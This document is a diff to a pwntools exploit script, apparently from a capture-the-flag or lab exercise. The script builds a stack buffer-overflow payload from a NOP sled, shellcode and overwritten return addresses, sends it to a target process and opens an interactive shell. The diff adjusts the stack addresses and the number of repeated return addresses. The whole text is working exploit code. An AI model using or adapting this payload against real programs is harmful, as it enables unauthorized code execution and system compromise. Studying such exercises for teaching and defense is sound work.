@@ -1,8 +1,8 @@
 from pwn import *
 
 PTR = 0xffffcdbc
-EBP = 0xffffcda8
-BUFF = EBP - 0x108
+EBP = 0xffffcdc8
+BUFF = EBP - 0x208
 RET = 0x080491d2
 
 if __name__ == "__main__":
@@ -16,6 +16,6 @@ if __name__ == "__main__":
 
     padsize = EBP - BUFF + 4
 
-    payload = shellcode.rjust(padsize, p8(0x90)) + p32(RET) + p32(RET)+ p32(RET) + p32(RET) + p8(0x0)
+    payload = shellcode.rjust(padsize, p8(0x90)) + p32(RET) + p32(RET) + p8(0x0)
     p.sendline(payload)
     p.interactive()
